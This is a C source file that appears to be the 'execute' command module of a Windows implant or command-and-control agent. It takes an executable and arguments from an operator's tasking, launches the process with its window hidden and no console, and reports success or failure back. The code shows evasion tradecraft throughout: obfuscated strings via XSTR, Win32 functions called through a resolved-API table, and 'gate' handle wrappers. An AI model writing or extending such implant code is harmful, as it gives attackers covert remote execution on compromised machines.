#include "config.h"
#ifdef INCLUDE_CMD_EXECUTE

#include "commands.h"
#include "common.h"

// execute <executable> [arguments]: fire-and-forget, no output capture, no wait
VOID cmd_execute(PINSTANCE inst, PPARSER args, PPACKAGE response) {
    DWORD exe_len = 0, arg_len = 0;
    char* exe = parser_string(args, &exe_len);
    char* cargs = parser_string(args, &arg_len);
    if (!exe || exe_len == 0) {
        package_add_string(inst, response, XSTR("No executable specified"));
        response->is_error = TRUE;
        return;
    }

    char cmd_line[2048] = {0};
    DWORD pos = 0;
    BOOL has_space = FALSE;
    for (DWORD i = 0; i < exe_len; i++) {
        if (exe[i] == ' ') { has_space = TRUE; break; }
    }
    if (has_space && exe[0] != '"') cmd_line[pos++] = '"';
    for (DWORD i = 0; i < exe_len && pos < sizeof(cmd_line) - 2; i++)
        cmd_line[pos++] = exe[i];
    if (has_space && exe[0] != '"') cmd_line[pos++] = '"';
    if (cargs && arg_len > 0 && pos < sizeof(cmd_line) - 2) {
        cmd_line[pos++] = ' ';
        for (DWORD i = 0; i < arg_len && pos < sizeof(cmd_line) - 2; i++)
            cmd_line[pos++] = cargs[i];
    }

    STARTUPINFOA si;
    es_memset(&si, 0, sizeof(si));
    si.cb = sizeof(si);
    si.dwFlags = STARTF_USESHOWWINDOW;
    si.wShowWindow = SW_HIDE;

    PROCESS_INFORMATION pi;
    es_memset(&pi, 0, sizeof(pi));

    BOOL ok = inst->Win32.CreateProcessA(
        NULL, cmd_line, NULL, NULL, FALSE,
        CREATE_NO_WINDOW, NULL, NULL, &si, &pi);

    if (!ok) {
        char err[128] = {0};
        const char* prefix = XSTR("Failed to execute: ");
        DWORD p = 0;
        for (; prefix[p] && p < 100; p++) err[p] = prefix[p];
        for (DWORD i = 0; exe[i] && p < 126; i++) err[p++] = exe[i];
        package_add_string(inst, response, err);
        response->is_error = TRUE;
        return;
    }

    gate_CloseHandle(inst, pi.hProcess);
    gate_CloseHandle(inst, pi.hThread);

    package_add_string(inst, response, XSTR("Command executed"));
}

#endif
